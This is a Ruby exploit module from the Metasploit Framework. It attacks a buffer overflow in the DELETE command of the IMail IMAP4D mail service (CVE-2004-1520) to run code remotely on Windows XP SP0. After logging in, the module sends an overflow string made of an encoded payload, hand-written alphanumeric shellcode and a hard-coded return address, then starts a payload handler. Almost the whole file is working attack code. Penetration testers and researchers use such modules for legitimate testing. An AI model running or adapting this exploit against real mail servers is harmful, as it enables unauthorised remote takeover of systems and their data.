##
# $Id: imail_delete.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IMail IMAP4D Delete Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the 'DELETE'
				command of the the IMail IMAP4D service. This vulnerability
				can only be exploited with a valid username and password.
				This flaw was patched in version 8.14.
			},
			'Author'         => [ 'spoonm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2004-1520'],
					[ 'OSVDB', '11838'],
					[ 'BID', '11675'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC'  => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 614,
					'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
					'StackAdjustment' => -3500,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EDX',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# alphanum rets :(, will look more into it later
					['Windows XP sp0 comctl32.dll', { 'Ret' => 0x77364650 }],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect_login

		print_status("Sending overflow string...")
		req = 'A683 DELETE '
		req << payload.encoded

		# Jump over code
		req << "\x74\x32\x75\x30"
		req << [target.ret].pack('V')
		req << rand_text_alphanumeric(44)

		# GetEIP code
		req << "\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x5a\x6a\x31\x59"
		req << "\x6b\x42\x34\x49\x30\x42\x4e\x42\x49\x75\x50\x4a\x4a\x52\x52\x59"

		# Alphanumeric jmp back (edx context)
		req << "\x6a\x6a\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41"
		req << "\x7a\x42\x32\x42\x41\x32\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50"
		req << "\x75\x4a\x49\x52\x7a\x71\x4a\x4d\x51\x7a\x4a\x6c\x55\x66\x62\x57"
		req << "\x70\x55\x50\x4b\x4f\x6b\x52\x6a"

		# Run off the stack, so we don't kill our payload, or something...
		req << rand_text_alphanumeric(600)

		# Terminate the request
		req << "\r\n"

		sock.put(req)

		handler
		disconnect
	end

end
